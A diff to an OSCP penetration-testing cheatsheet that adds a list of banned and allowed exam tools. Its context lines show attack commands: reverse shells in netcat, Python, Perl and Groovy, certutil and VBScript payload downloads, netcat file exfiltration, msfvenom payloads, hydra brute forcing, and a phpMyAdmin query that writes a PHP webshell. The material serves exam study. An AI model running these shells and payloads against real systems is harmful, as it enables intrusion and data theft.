@@ -9,8 +9,40 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
 *There are a number of tools you are not allowed to use during your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them in your exam. You can find detailed information about tool usage in the exam guidelines.*
 **Use for educational purposes only!**
 
-***
+_**Updated** July/15/2024_
+#### [Exam Restrictions](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions)
 
+You cannot use any of the following on the exam:
+
+- Spoofing (IP, ARP, DNS, NBNS, etc)
+- Commercial tools or services (Metasploit Pro, Burp Pro, etc.)
+- Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)
+- Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)
+- AI Chatbots (OffSec KAI, ChatGPT, YouChat, etc.)
+- Features in other tools that utilize either forbidden or restricted exam limitations
+
+Any tools that perform similar functions as those above are also prohibited. You are ultimately responsible for knowing what features or external utilities any chosen tool is using. The primary objective of the OSCP exam is to evaluate your skills in identifying and exploiting vulnerabilities, not in automating the process.
+
+You may however, use tools such as Nmap (and its scripting engine), Nikto, Burp Free, DirBuster etc. against any of your target systems.
+
+### [Which tools are allowed for the OSCP exam?](https://help.offsec.com/hc/en-us/articles/4412170923924#h_01FP8CCWDT0GX03RCE6RGYRZT4)
+
+All tools that do not perform any restricted actions are allowed during the exam. The following tools are allowed, but the list is not limited to these:
+
+- BloodHound (Legacy and Community Edition only)
+- SharpHound
+- PowerShell Empire
+- Covenant 
+- Powerview
+- Rubeus
+- evil-winrm
+- Responder (Poisoning and Spoofing is not allowed in the challenges or on the exam)
+- Crackmapexec
+- Mimikatz
+- Impacket
+- PrintSpoofer
+
+***
 # Reconnaissance
 
 ## Autorecon
@@ -21,7 +53,6 @@ autorecon -vv 192.168.0.1
 ```
 
 ***
-
 ## Nmap
 
 ### Initial Fast TCP Scan
@@ -68,7 +99,6 @@ nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vul
 ```
 
 ***
-
 ## Gobuster
 
 ### HTTP
@@ -93,7 +123,6 @@ gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/director
 *Set the `--insecuressl` flag.*
 
 ***
-
 ## SMBCLIENT
 
 To fix `NT_STATUS_CONNECTION_DISCONNECTED` errors in new Kali installations add `client min protocol = NT1` to your `\etc\samba\smb.conf` file.
@@ -135,7 +164,6 @@ get "\Users\John\file.txt:SECRET:$DATA"
 ```
 
 ***
-
 ## Enum4Linux
 
 ### Scan Host
@@ -148,7 +176,6 @@ enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out
 ```
 
 ***
-
 ## NFS
 
 ### Show mountable drives
@@ -163,13 +190,11 @@ mount -t nfs -o soft 192.168.0.1:/backup mpt/
 ```
 
 ***
-
 ## WebApp Paths
 
 https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md
 
 ***
-
 ## SQLMAP
 
 **DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.**
@@ -204,7 +229,6 @@ sqlmap -r post_request.txt --dbms "mysql" --os-shell
 ```
 
 ***
-
 # Brute Force
 
 ## Hydra
@@ -236,7 +260,6 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share
 ```
 
 ***
-
 # File Transfer
 
 ## Powershell
@@ -257,7 +280,6 @@ powershell.exe -NoProfile -encoded $Encoded
 ```
 
 ***
-
 ## Certutil
 
 ### Download
@@ -271,7 +293,6 @@ os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell
 ```
 
 ***
-
 ## SMB
 
 ### Start Impacket SMB Server (With SMB2 Support)
@@ -291,7 +312,6 @@ copy \\192.168.0.1\server_name\shell.exe shell.exe
 ```
 
 ***
-
 ## PureFTP
 
 ### Install
@@ -351,7 +371,6 @@ ftp -v -n -s:ftp.txt
 ```
 
 ***
-
 ## Netcat
 
 ## Receiving Shell
@@ -365,7 +384,6 @@ nc -w 3 192.168.0.1 1234 < out.file
 ```
 
 ***
-
 ## TFTP
 
 ### Start TFTP Daemon (Folder /var/tftp)
@@ -381,7 +399,6 @@ tftp -i 192.168.0.1 GET whoami.exe
 ```
 
 ***
-
 ## VBScript 
 
 ### Create wget.vbs File 
@@ -420,18 +437,15 @@ cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
 ```
 
 ***
-
 # Shells
 
 ***
-
 ## Upgrade Your Shell (TTY Shell)
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash");' 
 ```
 
 ***
-
 ## Enable Tab-Completion
 1. In your active shell press `bg` to send your nc session to background
 2. Enter `stty raw -echo`
@@ -439,7 +453,6 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 4. Enter `export TERM=xterm-256color`
 
 ***
-
 ## Catching Reverse Shells (Netcat)
 *rlwrap enables the usage of arrow keys in your shell.*
 https://github.com/hanslub42/rlwrap
@@ -448,7 +461,6 @@ rlwrap nc -nlvp 4444
 ```
 
 ***
-
 ## Netcat
 
 ### Reverse Shell
@@ -502,7 +514,6 @@ nc 192.168.0.1 4444
 ```
 
 ***
-
 ## Bash
 
 ### Reverse Shell
@@ -512,7 +523,6 @@ nc 192.168.0.1 4444
 ```
 
 ***
-
 ## Python
 
 ### As Command (Reverse Shell)
@@ -531,7 +541,6 @@ p=subprocess.call(["/bin/sh","-i"])
 ```
 
 ***
-
 ## PHP
 
 ### Kali Default PHP Reverse Shell
@@ -574,7 +583,6 @@ http://192.168.0.1/cmd_shell.php?cmd=whoami
 https://github.com/WhiteWinterWolf/wwwolf-php-webshell
 
 ***
-
 ## MSFVENOM
 
 ### Windows Binary (.exe)
@@ -649,7 +657,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o re
 ```
 
 ***
-
 ## Active Sever Pages Extended (.aspx)
 
 ### Transfer A File (Certutil)
@@ -673,7 +680,6 @@ Response.write(o)
 ```
 
 ***
-
 ## Jenkins / Groovy (Java)
 
 ### Linux Reverse Shell
@@ -693,7 +699,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ***
-
 ## Perl
 
 ### Reverse Shell
@@ -702,7 +707,6 @@ perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STRE
 ```
 
 ***
-
 ## PhpmyAdmin
 
 Write a CMD shell into a file with the right permissions. Issue the following select.
@@ -719,3 +723,4 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 ```
 
 ***
+
